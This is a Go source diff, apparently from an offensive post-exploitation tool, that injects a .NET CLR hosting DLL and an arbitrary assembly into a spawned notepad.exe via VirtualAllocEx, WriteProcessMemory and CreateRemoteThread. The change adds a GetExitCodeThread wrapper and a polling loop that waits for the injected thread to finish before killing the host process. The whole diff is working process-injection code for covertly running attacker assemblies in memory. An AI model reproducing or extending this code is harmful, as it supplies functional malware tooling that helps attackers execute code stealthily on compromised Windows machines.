@@ -10,7 +10,9 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
+	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
@@ -27,6 +29,7 @@ var (
 	procVirtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
 	procWriteProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
 	procCreateRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
+	procGetExitCodeThread  = kernel32.MustFindProc("GetExitCodeThread")
 )
 
 func virtualAllocEx(process syscall.Handle, addr uintptr, size, allocType, protect uint32) (uintptr, error) {
@@ -73,6 +76,20 @@ func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, 
 		return syscall.InvalidHandle, 0, os.NewSyscallError("CreateRemoteThread", e1)
 	}
 	return syscall.Handle(r1), threadID, nil
+}
+
+func getExitCodeThread(threadHandle syscall.Handle) (uint32, error) {
+	var exitCode uint32
+	r1, _, e1 := procGetExitCodeThread.Call(
+		uintptr(threadHandle),
+		uintptr(unsafe.Pointer(&exitCode)))
+	log.Println("r1:", r1)
+	log.Printf("Thread State: 0x%08x\n (%d)", exitCode, exitCode)
+	if r1 == 0 {
+		log.Println("r1 was zero:", e1.Error())
+		return exitCode, e1
+	}
+	return exitCode, nil
 }
 
 // ExecuteAssembly loads a .NET CLR hosting DLL inside a notepad.exe process
@@ -131,11 +148,24 @@ func ExecuteAssembly(hostingDll, assembly []byte, params string) error {
 	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
 	// CreateRemoteThread(DLL addr + offset, assembly addr)
 	attr := new(syscall.SecurityAttributes)
-	_, _, err = createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
+	threadHandle, _, err := createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
 	if err != nil {
 		return err
 	}
-
+	log.Println("Got thread handle:", threadHandle)
+	for {
+		code, err := getExitCodeThread(threadHandle)
+		log.Println(code)
+		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
+			log.Fatalln(err.Error())
+		}
+		if code == 259 {
+			time.Sleep(1000 * time.Millisecond)
+		} else {
+			break
+		}
+	}
+	cmd.Process.Kill()
 	go func() {
 		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
 	}()
